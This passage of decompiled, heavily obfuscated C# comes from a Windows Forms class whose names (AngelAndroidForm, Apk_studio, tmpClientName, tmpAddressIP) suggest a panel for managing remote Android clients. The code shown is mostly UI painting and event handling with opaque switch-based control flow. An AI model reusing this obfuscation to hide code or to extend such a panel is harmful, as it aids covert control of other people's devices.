            if (Apk_studio.\u0024IR56\u002D2 != null)
            {
              num1 = (int) num2 * 1363253319 ^ 80123346;
              continue;
            }
            goto label_6;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      WaitCallback callBack = Apk_studio.\u0024IR56\u002D2;
      goto label_7;
label_6:
      // ISSUE: reference to a compiler-generated method
      callBack = Apk_studio.\u0024IR56\u002D2 = new WaitCallback(Apk_studio.\u0024I._Lambda\u0024__R56\u002D2);
label_7:
      object[] state = new object[8]
      {
        (object) this.DGV0,
        (object) ((Apk_studio) this).tmpFolderUSER,
        (object) EXGuarder.\u00328081E70,
        (object) ((Apk_studio) this).tmpClientName,
        (object) (((Apk_studio) this).tmpCountry + EXGuarder.\u0035D5E042C + ((Apk_studio) this).tmpAddressIP),
        (object) EXGuarder.\u00347446730,
        (object) EXGuarder.\u00302517727,
        (object) (DateAndTime.Now.ToString(EXGuarder.\u00363577173) + EXGuarder.\u00351575E55)
      };
      ThreadPool.QueueUserWorkItem(callBack, (object) state);
    }

    private void BoxTitle_Paint(object sender, PaintEventArgs e)
    {
      if (!((Apk_studio) this).BoxTitlePaintEventArgsWait)
        return;
label_1:
      int num1 = 66255746;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string str1;
        string str2;
        Brush brush1;
        Brush brush2;
        Size size;
        switch ((num3 = (uint) (-666734460 - -((num2 - (1045357317 + -(~596566012 - 1219344785) - ((-~-914039261 ^ -566572412) - (-108655462 * -418761937 - -34743627 * -183558030 + -~-1875070349))) - ((-2007435401 - -550364436 + --1742160189 ^ ~(-1331265415 * 1793399848)) - (-~1468789600 + -14777722)) ^ (~-1128067303 - ~1250315510) * -82493613) * -1062280281))) % 10U)
        {
          case 0:
            goto label_12;
          case 1:
            this.BoxTitle.Height = checked (size.Height + 3);
            num1 = (int) num3 * -1764292966 ^ 1513157352;
            continue;
          case 2:
            size = TextRenderer.MeasureText(EXGuarder.\u003666D781E, Settings.f);
            num1 = (int) num3 * -26563573 ^ 669667979;
            continue;
          case 3:
            int num4 = this.BoxTitle.Height == checked (size.Height + 3) ? -2145328955 : (num4 = -312116218);
            num1 = num4 ^ (int) num3 * -1588410315;
            continue;
          case 4:
            Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, checked (TextRenderer.MeasureText(str1 + Strings.Space(10) + str2, Settings.f).Height + 5));
            e.Graphics.FillRectangle(new Pen(brush1).Brush, rect);
            num1 = (int) num3 * -134902550 ^ -5431681;
            continue;
          case 5:
            Color backColor = this.BoxTitle.BackColor;
            int r = (int) backColor.R;
            backColor = this.BoxTitle.BackColor;
            int g = (int) backColor.G;
            backColor = this.BoxTitle.BackColor;
            int b = (int) backColor.B;
            brush1 = (Brush) new SolidBrush(Color.FromArgb(170, r, g, b));
            num1 = (int) num3 * -2140606173 ^ 679342067;
            continue;
          case 6:
            int count = this.DGV0.Rows.Count;
            str1 = EXGuarder.\u003455F5412 + Conversions.ToString(count);
            str2 = EXGuarder.\u00362343A19 + Conversions.ToString(this.DGV0.SelectedRows.Count);
            Color defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int) defaultColorForeground.R, (int) defaultColorForeground.G, (int) defaultColorForeground.B)), 0, 1, this.BoxTitle.Width, 1);
            num1 = (int) num3 * 2002813716 ^ -928173340;
            continue;
          case 7:
            goto label_1;
          case 8:
            brush2 = (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground);
            num1 = (int) num3 * -1587231409 ^ 125056417;
            continue;
          case 9:
            e.Graphics.DrawString(str1 + Strings.Space(10) + str2 + Strings.Space(10), Settings.f, brush2, 0.0f, 2f);
            num1 = (int) num3 * 66823822 ^ -1828033682;
            continue;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    private void AngelAndroidForm_Activated(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void BoxTitle_Resize(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    static AccountManager()
    {
      Apk_studio.\u0024I = (AccountManager._Closure\u0024__) new AccountManager();
    }
  }
}
